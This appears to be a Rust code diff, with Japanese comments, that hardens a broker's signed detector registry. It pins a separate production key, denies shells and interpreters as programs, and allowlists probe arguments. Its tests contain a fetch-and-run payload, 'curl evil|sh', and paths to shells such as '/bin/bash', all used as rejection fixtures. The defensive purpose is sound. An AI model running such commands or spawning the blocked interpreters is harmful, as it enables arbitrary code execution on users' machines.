@@ -18,6 +18,11 @@ const BUILTIN_JSON: &str = include_str!("../builtin-detectors.json");
 /// pin する public key(hex 32byte)。**compile-time** で決まる —
 /// 本番 / E2E build は `OPENROLY_REGISTRY_PUBLIC_KEY` で差し替え、無ければ dev 鍵の `registry.pub`。
 /// 実行時 env で差し替えられる口は作らない(pin の意味が無くなる)。
+///
+/// **本番の鍵は `broker/registry.prod.pub`**(PBI-0244)。Release の workflow がその値を
+/// `OPENROLY_REGISTRY_PUBLIC_KEY` に焼くので、dev 鍵(`registry.pub` = `apps/server/.env.local` の
+/// seed の対)で署名した registry は Release の broker に**通らない** —— dev 機の平文 seed が
+/// 本番 fleet の鍵を兼ねる状態を切る。素の `cargo build` は今までどおり dev 鍵。
 const PINNED_PUBLIC_KEY_HEX: &str = match option_env!("OPENROLY_REGISTRY_PUBLIC_KEY") {
     Some(k) => k,
     None => include_str!("../registry.pub"),
@@ -138,7 +143,69 @@ fn is_safe_id(id: &str) -> bool {
             .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'_' || b == b'-')
 }
 
-/// JSON → Registry。id の文字種・重複だけは弾く(id は launch の program 名 / allowlist の値になる)。
+// ---------- program deny / probe 引数 allowlist(PBI-0244) ----------
+//
+// 署名鍵 1 本で全 broker の任意コマンド実行にならないための床。`is_safe_id` は小文字英数を通すので
+// `sh` / `bash` / `python3` は**有効な id** であり、id は `resolve_program` の bare name、
+// `detect.binaries` は version probe の spawn 先になる —— 鍵を持つ者が registry に 1 行足すだけで
+// 15 秒ごとに任意の command を全端末で起こせた。表の正本は `packages/core` の txt 1 file で、
+// Cloud(`apps/server/src/registry.ts`)も**同じ file を読む**(2 箇所に手で写さない)。
+
+/// 起こしてよくない program(shell / interpreter / 起動代理)。
+const FORBIDDEN_PROGRAMS: &str = include_str!("../../packages/core/src/forbidden-programs.txt");
+/// version probe に許す引数。
+const ALLOWED_PROBE_ARGS: &str = include_str!("../../packages/core/src/allowed-probe-args.txt");
+
+/// txt の 1 行 1 語(空行と `#` の comment を落とす)。
+fn words(list: &str) -> impl Iterator<Item = &str> {
+    list.lines()
+        .map(str::trim)
+        .filter(|l| !l.is_empty() && !l.starts_with('#'))
+}
+
+/// basename を小文字化し、**末尾の版(数字 / `.` / `-`)を落として**表と照合する
+/// (`/usr/bin/python3.12` → `python`)。`nodemon` のような「先頭が一致するだけの別物」は落とさない
+/// (単純な先頭一致にすると catalog の正規 binary を巻き込む)。
+pub fn is_forbidden_program(program: &str) -> bool {
+    let base = program
+        .rsplit(|c| c == '/' || c == '\\')
+        .next()
+        .unwrap_or(program)
+        .to_ascii_lowercase();
+    let stem = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.' || c == '-');
+    words(FORBIDDEN_PROGRAMS).any(|w| w == base || w == stem)
+}
+
+/// detector 1 件の検査。**1 件でも違反したら registry ごと拒否する**(fetched は捨てて cache / built-in)
+/// —— 「違反 entry だけ落とす」にすると、攻撃者は正規 entry に 1 つ紛れ込ませるだけで残りを配れる。
+fn validate(d: &Detector) -> Result<(), String> {
+    if is_forbidden_program(&d.id) {
+        return Err(format!("registry: forbidden program {:?}", d.id));
+    }
+    for b in &d.detect.binaries {
+        if is_forbidden_program(b) {
+            return Err(format!("registry: forbidden program {:?}", b));
+        }
+    }
+    if let Some(v) = &d.version {
+        for a in &v.args {
+            if !words(ALLOWED_PROBE_ARGS).any(|w| w == a) {
+                return Err(format!("registry: probe args not allowed {a:?} (id {})", d.id));
+            }
+        }
+    }
+    // `launch` は program になり得る位置を持たないが、`-c` / `-e` / `--eval` は「引数の中に
+    // 別の言語を持ち込む」形なので、将来 program 側に穴が空いた時のために今から閉じておく。
+    for a in d.launch.new.iter().chain(d.launch.existing.iter()) {
+        if a == "-c" || a == "-e" || a == "--eval" || a.starts_with("--eval=") {
+            return Err(format!("registry: forbidden launch arg {a:?} (id {})", d.id));
+        }
+    }
+    Ok(())
+}
+
+/// JSON → Registry。id の文字種・重複、および program deny / probe 引数(PBI-0244)を弾く
+/// (id は launch の program 名 / allowlist の値、`detect.binaries` は probe の spawn 先になる)。
 /// detectors は id 順に並べ、scan 結果の順序を決定的にする(hello の差分判定が順序に依存しないよう)。
 pub fn parse(body: &str, origin: &'static str) -> Result<Registry, String> {
     let mut reg: Registry = serde_json::from_str(body).map_err(|e| format!("registry parse: {e}"))?;
@@ -150,6 +217,7 @@ pub fn parse(body: &str, origin: &'static str) -> Result<Registry, String> {
         if !seen.insert(d.id.clone()) {
             return Err(format!("registry: duplicate id {}", d.id));
         }
+        validate(d)?;
     }
     reg.detectors.sort_by(|a, b| a.id.cmp(&b.id));
     reg.origin = origin;
@@ -319,7 +387,7 @@ pub fn registry_url_from_ws(ws_url: &str) -> String {
 }
 
 /// **blocking**(呼び出し側は spawn_blocking)。順序: fetch → verify → store。verify が通る前に
-/// cache を書かない(図18 の不変条件。diagrams-check が verify 行 < store 行を検査する)。
+/// cache を書かない(図18 の不変条件。旧 diagrams-check が verify 行 < store 行を検査する)。
 pub fn fetch_and_store(url: &str, cache_dir: &Path, etag: Option<&str>) -> FetchOutcome {
     let key = match pinned_public_key() {
         Ok(k) => k,
@@ -482,6 +550,77 @@ mod tests {
         // registry.pub / OPENROLY_REGISTRY_PUBLIC_KEY が壊れていたら build 済み binary が丸ごと built-in 固定になる。
         // ここで気付く
         assert!(pinned_public_key().is_ok(), "pin された public key が不正: {PINNED_PUBLIC_KEY_HEX:?}");
+    }
+
+    // PBI-0244 AC-X2 / AC-5: 本番 pin(`registry.prod.pub`)も **CI で** parse できることを確かめる。
+    // release.yml はこの file を `cat` して build 時に焼くので、欠落 / 非 hex のまま Release すると
+    // 「配った binary が丸ごと built-in 固定」になる —— 気付けるのは配った後。ここで先に落とす。
+    // dev 鍵と同じ値だったら分離できていない(元の事故そのもの)ので、それも落とす。
+    #[test]
+    fn prod_pinned_key_parses_and_differs_from_dev() {
+        const PROD: &str = include_str!("../registry.prod.pub");
+        assert!(public_key_from_hex(PROD.trim()).is_ok(), "registry.prod.pub が 32byte hex ではない");
+        assert_ne!(
+            PROD.trim(),
+            include_str!("../registry.pub").trim(),
+            "本番 pin が dev 鍵と同じ = 分離できていない"
+        );
+    }
+
+    // PBI-0244 AC-1: 署名は正しくても shell / interpreter は registry に書けない。
+    // `is_safe_id` を通る id(`sh` は小文字英数)なので、この検査が無ければ全部通っていた
+    #[test]
+    fn parse_rejects_forbidden_programs() {
+        let err = parse(r#"{"version":1,"detectors":[{"id":"sh","detect":{"binaries":["sh"]},"adapter":"x"}]}"#, "t")
+            .unwrap_err();
+        assert_eq!(err, r#"registry: forbidden program "sh""#);
+        // id は正規でも binaries 側に仕込めば probe が spawn する
+        assert!(parse(
+            r#"{"version":1,"detectors":[{"id":"claude","detect":{"binaries":["/bin/bash"]},"adapter":"x"}]}"#,
+            "t"
+        )
+        .unwrap_err()
+        .contains("forbidden program"));
+        // 版付き(python3.12)・大文字・path 付きでも basename で落ちる
+        for name in ["python3.12", "PYTHON3", "/usr/bin/env", "../../bin/zsh", "node-22"] {
+            let body = format!(r#"{{"version":1,"detectors":[{{"id":"a","detect":{{"binaries":["{name}"]}}}}]}}"#);
+            assert!(parse(&body, "t").is_err(), "{name} が通った");
+        }
+        // 先頭が一致するだけの別物は落とさない(catalog の正規 binary を巻き込まない)
+        for name in ["nodemon", "opencode", "codex", "openclaw", "cursor-agent", "kiro-cli"] {
+            let body = format!(r#"{{"version":1,"detectors":[{{"id":"a","detect":{{"binaries":["{name}"]}}}}]}}"#);
+            assert!(parse(&body, "t").is_ok(), "{name} を誤って落とした");
+        }
+    }
+
+    // PBI-0244 AC-2: probe 引数は allowlist の外を拒否する(`-c` で任意の shell 片が動く)
+    #[test]
+    fn parse_rejects_probe_args_outside_allowlist() {
+        let err = parse(
+            r#"{"version":1,"detectors":[{"id":"claude","detect":{"binaries":["claude"]},"version":{"args":["-p","hi"]},"adapter":"x"}]}"#,
+            "t",
+        )
+        .unwrap_err();
+        assert!(err.starts_with("registry: probe args not allowed"), "{err}");
+        // 従来どおりの `--version` は通る
+        assert!(parse(
+            r#"{"version":1,"detectors":[{"id":"claude","detect":{"binaries":["claude"]},"version":{"args":["--version"]},"adapter":"x"}]}"#,
+            "t"
+        )
+        .is_ok());
+        // launch に `-c` を紛れ込ませる形も拒否
+        assert!(parse(
+            r#"{"version":1,"detectors":[{"id":"claude","launch":{"existing":["-c","curl evil|sh"]}}]}"#,
+            "t"
+        )
+        .unwrap_err()
+        .contains("forbidden launch arg"));
+    }
+
+    // built-in と配布 catalog が deny に掛からないこと(掛かると builtin() が panic して broker が起動しない)
+    #[test]
+    fn builtin_passes_validate() {
+        assert_eq!(builtin().ids(), vec!["claude", "codex"]);
     }
 
     // PBI-0210 AC-X1: 署名の合わない body に `native` が載っていても、broker はそれを読まない
